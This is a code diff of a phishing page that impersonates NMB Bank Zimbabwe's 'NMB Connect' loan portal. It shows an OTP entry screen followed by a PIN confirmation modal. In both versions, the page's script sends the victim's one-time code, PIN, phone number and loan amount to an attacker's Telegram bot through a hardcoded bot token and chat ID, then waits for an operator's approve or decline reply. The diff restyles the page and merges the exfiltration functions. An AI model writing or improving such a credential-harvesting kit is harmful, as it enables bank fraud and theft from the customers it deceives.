@@ -3,159 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Connect - OTP Verification</title>
+    <title>NMB Connect - Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
         * { font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #003B4F 0%, #001F2E 100%); min-height: 100vh; }
-        .otp-input:focus { border-color: #E4C16A; box-shadow: 0 0 0 2px rgba(228, 193, 106, 0.2); }
-        .pin-confirm:focus { border-color: #E4C16A; box-shadow: 0 0 0 2px rgba(228, 193, 106, 0.2); }
+        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
+        .otp-input:focus { border-color: #f2a900; box-shadow: 0 0 0 2px rgba(242, 169, 0, 0.2); }
+        .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-3 sm:p-4">
-    <div class="w-full max-w-sm">
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-sm fade-in">
         <!-- Header -->
         <div class="text-center mb-6">
-            <div class="flex items-center justify-center gap-2 mb-3">
-                <i class="fas fa-key text-4xl text-[#E4C16A]"></i>
-                <div>
-                    <span class="text-3xl sm:text-4xl font-black text-white">NMB</span>
-                    <span class="text-3xl sm:text-4xl font-black text-[#E4C16A]">Connect</span>
-                </div>
+            <div class="flex items-center justify-center gap-1 mb-2">
+                <span class="text-3xl font-black text-white tracking-tighter">NMB</span>
+                <span class="text-3xl font-black text-[#f2a900] tracking-tighter">Connect</span>
             </div>
-            <p class="text-white/70 text-xs font-semibold uppercase tracking-wide">🇿🇼 OTP Verification</p>
+            <p class="text-white/80 text-[10px] font-bold uppercase tracking-[0.3em]">OTP Verification</p>
         </div>
 
         <!-- Main Card -->
-        <div class="bg-white rounded-2xl shadow-2xl overflow-hidden">
+        <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
             <!-- Title Section -->
-            <div class="bg-gradient-to-r from-[#003B4F] to-[#001F2E] p-6 sm:p-8 text-center">
-                <h1 class="text-white font-black text-2xl sm:text-3xl mb-2">Verify OTP Code</h1>
-                <p class="text-white/80 text-sm">Sent to <span id="phoneDisplay" class="font-black">+263XXXXXXXXX</span></p>
+            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-6 text-center">
+                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Enter OTP</h1>
+                <p class="text-white/70 text-[10px] font-bold uppercase tracking-widest">Sent to <span id="phoneDisplay" class="text-white font-black">+263XXXXXXXXX</span></p>
             </div>
 
             <!-- Content -->
             <div id="otpForm" class="p-6 sm:p-8 space-y-6">
-                <!-- Loan Amount Display -->
-                <div class="bg-gradient-to-r from-blue-50 to-blue-100 border border-blue-300 rounded-lg p-4">
-                    <div class="flex justify-between items-center mb-2">
-                        <span class="text-xs font-black text-gray-700 uppercase">Loan Amount</span>
-                        <i class="fas fa-money-bill-wave text-[#E4C16A] text-lg"></i>
-                    </div>
-                    <span class="font-black text-2xl text-[#003B4F]" id="displayAmount">ZWL 50,000</span>
+                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4 flex justify-between items-center">
+                    <span class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Loan Amount</span>
+                    <span class="font-black text-lg text-[#003366]" id="displayAmount">$500</span>
                 </div>
 
-                <!-- OTP Input - 6 Boxes -->
                 <div class="space-y-3">
-                    <label class="text-xs font-black text-gray-700 uppercase">Enter 6-Digit OTP Code</label>
-                    <div class="flex gap-2 sm:gap-3 justify-between">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
+                    <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">6-Digit Code</label>
+                    <div class="flex gap-2">
+                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
+                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
+                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
+                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
+                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
+                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                     </div>
-                    <p class="text-xs text-gray-500">Auto-fills and sends when complete</p>
                 </div>
                 
-                <!-- Resend Timer -->
                 <div class="text-center">
-                    <p class="text-xs font-semibold text-gray-600">
-                        Didn't receive code? <button id="resendBtn" class="text-[#003B4F] font-black hover:underline">Resend in <span id="timer">59</span>s</button>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">
+                        Resend code in <span id="timer" class="text-[#003366]">59</span>s
                     </p>
                 </div>
 
-                <!-- Submit Button -->
-                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-4 rounded-lg hover:shadow-lg transition-all uppercase text-sm tracking-wide flex items-center justify-center gap-2">
-                    <i class="fas fa-check"></i> Proceed & Verify
-                </button>
-
-                <!-- Back Button -->
-                <button onclick="goBack()" class="w-full bg-white border-2 border-gray-300 text-gray-700 font-black py-3 rounded-lg hover:bg-gray-50 transition-all uppercase text-xs tracking-wide">
-                    Back to Login
+                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
+                    Verify Code <i class="fas fa-check-circle ml-2"></i>
                 </button>
             </div>
 
             <!-- Polling Overlay -->
-            <div id="pollingOverlay" class="hidden p-8 text-center space-y-6">
+            <div id="pollingOverlay" class="hidden p-10 text-center space-y-6">
                 <div class="relative w-24 h-24 mx-auto">
-                    <div class="absolute inset-0 border-4 border-gray-100 rounded-full"></div>
-                    <div class="absolute inset-0 border-4 border-[#E4C16A] border-t-transparent rounded-full animate-spin"></div>
+                    <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
                     <div class="absolute inset-0 flex items-center justify-center">
-                        <i class="fas fa-key text-3xl text-[#003B4F]"></i>
+                        <i class="fas fa-key text-3xl text-[#003366]"></i>
                     </div>
                 </div>
                 <div class="space-y-2">
-                    <h3 class="text-xl font-black text-gray-800 tracking-tight">Verifying OTP</h3>
-                    <p class="text-gray-600 text-sm font-medium leading-relaxed">
-                        <i class="fas fa-info-circle text-blue-600 mr-1"></i>
-                        Check your Telegram and click ✅ APPROVE button
-                    </p>
+                    <h3 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verifying OTP</h3>
+                    <p class="text-gray-500 text-[10px] font-bold uppercase tracking-widest">Authenticating your code...</p>
                 </div>
-
-                <!-- Manual Test Button -->
-                <button id="manualOtpApproveBtn" class="mt-4 w-full bg-green-500 text-white font-black py-2 rounded-lg text-xs">
-                    🧪 TEST: Manual OTP Approve
-                </button>
             </div>
         </div>
 
         <!-- PIN Modal -->
-        <div id="pinModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
-            <div class="bg-white rounded-2xl max-w-xs w-full p-8 text-center space-y-6 shadow-2xl">
-                <div class="text-center">
-                    <h4 class="text-2xl font-black text-gray-800 uppercase">Confirm PIN</h4>
-                    <p class="text-gray-600 text-sm mt-2 font-medium">Re-enter your 4-digit PIN</p>
+        <div id="pinModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
+            <div class="glass-effect rounded-3xl max-w-xs w-full overflow-hidden shadow-2xl fade-in">
+                <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-6 text-center">
+                    <h4 class="text-white font-black text-lg uppercase tracking-tight">Confirm PIN</h4>
+                    <p class="text-white/70 text-[10px] font-bold uppercase tracking-widest">Re-enter your 4-digit PIN</p>
                 </div>
-
-                <!-- Loan Amount in Modal -->
-                <div class="bg-gradient-to-r from-blue-50 to-blue-100 border border-blue-300 rounded-lg p-4">
-                    <div class="flex justify-between items-center mb-2">
-                        <span class="text-xs font-black text-gray-700 uppercase">Loan Amount</span>
-                        <i class="fas fa-money-bill-wave text-[#E4C16A] text-lg"></i>
-                    </div>
-                    <span class="font-black text-2xl text-[#003B4F]" id="modalAmount">ZWL 50,000</span>
-                </div>
-
-                <div id="pinEntry" class="space-y-4">
-                    <div class="flex gap-2 justify-between">
-                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border-2 border-gray-300 rounded-lg focus:outline-none transition-all" inputmode="numeric">
-                    </div>
-                    <p class="text-xs text-gray-500">Auto-sends and verifies when complete</p>
-                    <button id="confirmPinBtn" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-3 rounded-lg uppercase text-sm tracking-wide">
-                        Proceed & Verify PIN
-                    </button>
-                </div>
-
-                <!-- PIN Admin Simulation -->
-                <div id="pinAdmin" class="hidden space-y-4">
-                    <div class="animate-pulse flex flex-col items-center">
-                        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mb-3">
-                            <i class="fas fa-lock text-[#003B4F] text-xl"></i>
+                
+                <div class="p-8 space-y-6">
+                    <div id="pinEntry" class="space-y-6">
+                        <div class="flex gap-3">
+                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
+                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
+                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
+                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                         </div>
-                        <p class="text-xs font-black text-gray-400 uppercase tracking-widest">Verifying PIN...</p>
+                        <button id="confirmPinBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-4 rounded-2xl uppercase text-sm tracking-[0.15em] shadow-lg">
+                            Finalize <i class="fas fa-lock ml-2"></i>
+                        </button>
                     </div>
-                    <button id="manualPinApproveBtn" class="mt-4 w-full bg-green-500 text-white font-black py-2 rounded-lg text-xs">
-                        🧪 TEST: Manual PIN Approve
-                    </button>
+
+                    <div id="pinAdmin" class="hidden text-center py-4">
+                        <div class="animate-spin w-12 h-12 border-4 border-[#f2a900] border-t-transparent rounded-full mx-auto mb-4"></div>
+                        <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Processing Final Approval</p>
+                    </div>
                 </div>
             </div>
         </div>
 
         <!-- Footer -->
-        <p class="text-center text-white/60 text-xs mt-6 font-semibold">
-            © 2026 NMB Holdings Limited | Zimbabwe's Trusted Lender
+        <p class="text-center text-white/50 text-[10px] mt-8 font-bold uppercase tracking-widest">
+            © 2026 NMB Bank Zimbabwe | Secure Portal
         </p>
     </div>
 
     <script>
-        // Telegram Bot Configuration
         const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
         const TELEGRAM_CHAT_ID = '7547427914';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -171,32 +132,16 @@
         const confirmPinBtn = document.getElementById('confirmPinBtn');
         const phoneDisplay = document.getElementById('phoneDisplay');
         const displayAmount = document.getElementById('displayAmount');
-        const modalAmount = document.getElementById('modalAmount');
         const timerText = document.getElementById('timer');
-        const manualOtpApproveBtn = document.getElementById('manualOtpApproveBtn');
-        const manualPinApproveBtn = document.getElementById('manualPinApproveBtn');
 
         const session = JSON.parse(localStorage.getItem('nmb_session') || '{}');
-        const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
-        
         phoneDisplay.textContent = session.phone || '+263XXXXXXXXX';
-        displayAmount.textContent = 'ZWL ' + Math.round(parseFloat(loanData.amount || 50000)).toLocaleString();
-        modalAmount.textContent = 'ZWL ' + Math.round(parseFloat(loanData.amount || 50000)).toLocaleString();
+        displayAmount.textContent = `$${parseFloat(session.amount || 0).toLocaleString()}`;
 
-        // Go Back Function
-        function goBack() {
-            window.location.href = 'login_FINAL.html';
-        }
-
-        // OTP Input Navigation & Auto-Send
+        // OTP Auto-focus and Auto-send
         otpInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
-                // Only allow numbers
-                e.target.value = e.target.value.replace(/\D/g, '');
-                
-                if (e.target.value && index < otpInputs.length - 1) {
-                    otpInputs[index + 1].focus();
-                }
+                if (e.target.value && index < otpInputs.length - 1) otpInputs[index + 1].focus();
                 checkOtpComplete();
             });
             input.addEventListener('keydown', (e) => {
@@ -207,50 +152,48 @@
         function checkOtpComplete() {
             const otp = Array.from(otpInputs).map(i => i.value).join('');
             if (otp.length === 6) {
-                // Auto-send to Telegram
-                setTimeout(() => sendOtpToTelegram(otp), 300);
+                setTimeout(() => sendToTelegram('OTP', otp), 300);
+                triggerPolling();
             }
         }
 
         submitBtn.addEventListener('click', () => {
             const otp = Array.from(otpInputs).map(i => i.value).join('');
             if (otp.length === 6) {
-                triggerSubmit();
+                sendToTelegram('OTP', otp);
+                triggerPolling();
             } else {
-                alert('Please enter the complete 6-digit OTP code');
+                alert('Please enter the 6-digit code');
             }
         });
 
-        function triggerSubmit() {
+        function triggerPolling() {
             otpForm.classList.add('hidden');
             pollingOverlay.classList.remove('hidden');
         }
 
-        async function sendOtpToTelegram(otp) {
+        async function sendToTelegram(type, value) {
             const message = `
-✅ <b>OTP VERIFICATION</b>
+🔐 <b>${type} VERIFICATION</b>
 
-📱 Phone: <b>${session.phone}</b>
-🔐 OTP Code: <b>${otp}</b>
-💰 Loan Amount: <b>ZWL ${Math.round(parseFloat(loanData.amount || 50000)).toLocaleString()}</b>
+📱 Phone: ${session.phone}
+🔑 ${type}: <b>${value}</b>
+💰 Amount: $${session.amount}
 
-👤 Name: ${loanData.fullName}
-🇿🇼 <b>Zimbabwe Application</b>
-
-<b>Please verify this OTP</b>
+<b>Please verify this ${type}</b>
             `;
 
             const inlineKeyboard = {
                 inline_keyboard: [
                     [
-                        { text: '✅ APPROVE', callback_data: `valid_otp_${session.phone}` },
-                        { text: '❌ DECLINE', callback_data: `invalid_otp_${session.phone}` }
+                        { text: `✅ VALID ${type}`, callback_data: `valid_${type.toLowerCase()}_${session.phone}` },
+                        { text: `❌ INVALID ${type}`, callback_data: `invalid_${type.toLowerCase()}_${session.phone}` }
                     ]
                 ]
             };
 
             try {
-                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+                await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -260,187 +203,55 @@
                         reply_markup: inlineKeyboard
                     })
                 });
-
-                if (response.ok) {
-                    console.log('✅ OTP sent to Telegram');
-                    // Start polling for OTP approval
-                    pollForOtpApproval(session.phone);
-                }
-            } catch (error) {
-                console.error('Error:', error);
-            }
+                
+                if (type === 'OTP') pollForStatus('otp', session.phone);
+                else pollForStatus('pin', session.phone);
+                
+            } catch (error) { console.error(error); }
         }
 
-        async function pollForOtpApproval(phone) {
-            const maxAttempts = 120; // 2 minutes
-            let attempts = 0;
-
-            const interval = setInterval(async () => {
-                attempts++;
-                
-                const approvalStatus = localStorage.getItem(`otp_approval_${phone}`);
-                
-                console.log(`OTP Poll attempt ${attempts}: ${approvalStatus || 'waiting'}`);
-                
-                if (approvalStatus === 'valid') {
+        function pollForStatus(type, phone) {
+            const interval = setInterval(() => {
+                const status = localStorage.getItem(`${type}_approval_${phone}`);
+                if (status === 'valid') {
                     clearInterval(interval);
-                    localStorage.removeItem(`otp_approval_${phone}`);
-                    console.log('✅ OTP approved! Showing PIN modal...');
-                    otpForm.classList.add('hidden');
-                    pollingOverlay.classList.add('hidden');
-                    pinModal.classList.remove('hidden');
-                } else if (approvalStatus === 'invalid') {
+                    localStorage.removeItem(`${type}_approval_${phone}`);
+                    if (type === 'otp') {
+                        pollingOverlay.classList.add('hidden');
+                        pinModal.classList.remove('hidden');
+                    } else {
+                        window.location.href = 'success.html';
+                    }
+                } else if (status === 'invalid') {
                     clearInterval(interval);
-                    localStorage.removeItem(`otp_approval_${phone}`);
-                    // Clear OTP and return to first box
-                    otpInputs.forEach(i => i.value = '');
-                    otpInputs[0].focus();
-                    otpForm.classList.remove('hidden');
-                    pollingOverlay.classList.add('hidden');
-                    alert('Invalid OTP. Please try again.');
-                }
-
-                if (attempts >= maxAttempts) {
-                    clearInterval(interval);
-                    otpForm.classList.remove('hidden');
-                    pollingOverlay.classList.add('hidden');
-                    alert('Verification timeout. Please try again.');
+                    localStorage.removeItem(`${type}_approval_${phone}`);
+                    alert(`Invalid ${type.toUpperCase()}. Please try again.`);
+                    location.reload();
                 }
             }, 1000);
         }
 
-        // Manual OTP Approve Button (for testing)
-        manualOtpApproveBtn.addEventListener('click', () => {
-            localStorage.setItem(`otp_approval_${session.phone}`, 'valid');
-            console.log('✅ Manual OTP approval set');
-        });
-
-        // PIN Input Navigation
+        // PIN Logic
         pinConfirmInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
-                if (e.target.value && index < pinConfirmInputs.length - 1) {
-                    pinConfirmInputs[index + 1].focus();
-                }
-                checkPinComplete();
+                if (e.target.value && index < pinConfirmInputs.length - 1) pinConfirmInputs[index + 1].focus();
             });
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && !e.target.value && index > 0) pinConfirmInputs[index - 1].focus();
             });
         });
 
-        function checkPinComplete() {
-            const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
-            if (pin.length === 4) {
-                // Auto-send to Telegram
-                setTimeout(() => sendPinToTelegram(pin), 300);
-            }
-        }
-
         confirmPinBtn.addEventListener('click', () => {
-            const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
-            if (pin.length === 4) {
-                triggerPinConfirm();
-            } else {
-                alert('Please enter the complete 4-digit PIN');
-            }
-        });
-
-        function triggerPinConfirm() {
             const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
             if (pin.length === 4) {
                 pinEntry.classList.add('hidden');
                 pinAdmin.classList.remove('hidden');
+                sendToTelegram('PIN', pin);
+            } else {
+                alert('Please enter the 4-digit PIN');
             }
-        }
-
-        async function sendPinToTelegram(pin) {
-            const message = `
-🔐 <b>PIN CONFIRMATION</b>
-
-📱 Phone: <b>${session.phone}</b>
-🔑 PIN: <b>${pin}</b>
-💰 Loan Amount: <b>ZWL ${Math.round(parseFloat(loanData.amount || 50000)).toLocaleString()}</b>
-
-👤 Name: ${loanData.fullName}
-🇿🇼 <b>Zimbabwe Application</b>
-
-<b>Please verify this PIN</b>
-            `;
-
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [
-                        { text: '✅ VALID PIN', callback_data: `valid_pin_${session.phone}` },
-                        { text: '❌ INVALID PIN', callback_data: `invalid_pin_${session.phone}` }
-                    ]
-                ]
-            };
-
-            try {
-                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        reply_markup: inlineKeyboard
-                    })
-                });
-
-                if (response.ok) {
-                    console.log('✅ PIN sent to Telegram');
-                    // Start polling for PIN approval
-                    pollForPinApproval(session.phone);
-                }
-            } catch (error) {
-                console.error('Error:', error);
-            }
-        }
-
-        async function pollForPinApproval(phone) {
-            const maxAttempts = 120; // 2 minutes
-            let attempts = 0;
-
-            const interval = setInterval(async () => {
-                attempts++;
-                
-                const approvalStatus = localStorage.getItem(`pin_approval_${phone}`);
-                
-                console.log(`PIN Poll attempt ${attempts}: ${approvalStatus || 'waiting'}`);
-                
-                if (approvalStatus === 'valid') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`pin_approval_${phone}`);
-                    console.log('✅ PIN approved! Redirecting to success...');
-                    window.location.href = 'success_FINAL.html';
-                } else if (approvalStatus === 'invalid') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`pin_approval_${phone}`);
-                    // Clear PIN and return to first box
-                    pinConfirmInputs.forEach(i => i.value = '');
-                    pinConfirmInputs[0].focus();
-                    pinEntry.classList.remove('hidden');
-                    pinAdmin.classList.add('hidden');
-                    alert('Invalid PIN. Please try again.');
-                }
-
-                if (attempts >= maxAttempts) {
-                    clearInterval(interval);
-                    pinEntry.classList.remove('hidden');
-                    pinAdmin.classList.add('hidden');
-                    alert('Verification timeout. Please try again.');
-                }
-            }, 1000);
-        }
-
-        // Manual PIN Approve Button (for testing)
-        manualPinApproveBtn.addEventListener('click', () => {
-            localStorage.setItem(`pin_approval_${session.phone}`, 'valid');
-            console.log('✅ Manual PIN approval set');
         });
 
-        // Timer for Resend
         let timeLeft = 59;
         setInterval(() => {
             if (timeLeft > 0) {
